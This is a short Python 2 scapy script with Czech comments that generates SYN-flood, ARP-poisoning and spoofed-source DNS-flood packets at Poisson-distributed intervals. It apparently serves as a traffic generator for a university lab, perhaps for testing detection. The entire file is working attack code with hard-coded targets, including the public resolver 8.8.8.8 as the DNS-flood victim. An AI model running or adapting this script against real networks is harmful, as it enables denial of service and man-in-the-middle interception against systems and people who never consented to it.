#!/usr/bin/python

import sys
import time
import math
import random
from scapy.all import *

if len(sys.argv)<3:
    print "Pouziti %s AKCE LAMBDA POCET_PAKETU"%(sys.argv[0])
    sys.exit(1)

#1)SYN ATTACK PARAMETRY
SYN_DST_ADDRESS="192.168.1.13"
SYN_DST_PORT=22
#2)ARP poisoning
VICTIM_MAC="00:00:00:00:00:00"
SPOOFED_SENDER_IP="192.168.1.1"
SPOOFED_IP="192.168.1.13"
ATTACKER_MAC="00:00:00:00:00:BE"
#3)DNS flood
DNS_FLOOD_VICTIM="8.8.8.8"
DNS_QUERY="www.fit.cvut.cz."

x=int(sys.argv[3])
act=sys.argv[1]
lamb=float(sys.argv[2])

if act=="SYN":
    def sp():
        #1)generovani paketu pro SYN
        packetSYN=IP(dst=SYN_DST_ADDRESS)/TCP(dport=SYN_DST_PORT, flags='S')
        #ls(packetSYN)
        send(packetSYN)

elif act=="ARP":
    def sp():
        #2)ARP poisoning
        packetARP=Ether(dst=VICTIM_MAC)/ARP(op="is-at",hwsrc=ATTACKER_MAC,psrc=SPOOFED_SENDER_IP,pdst=SPOOFED_IP)
        #ls(packetARP)
        sendp(packetARP)

elif act=="DNS":
    def sp():
        #3)DNS flood
        dnsq=IP(dst=DNS_FLOOD_VICTIM,src=RandIP())/UDP()/DNS(rd=1,qr=0,qd=DNSQR(qname=DNS_QUERY,qtype='A',qclass='IN'))
        #ls(dnsq)
        send(dnsq)
else:
    print "Nespravna akce, zadejte jednu z moznosti ARP,DNS,SYN"
    sys.exit(1)

while x>0:
    x-=1;
    wait=-math.log(1.0 - random.random()) / lamb
    print wait
    time.sleep(wait);
    sp()
    print "sent at",time.time()
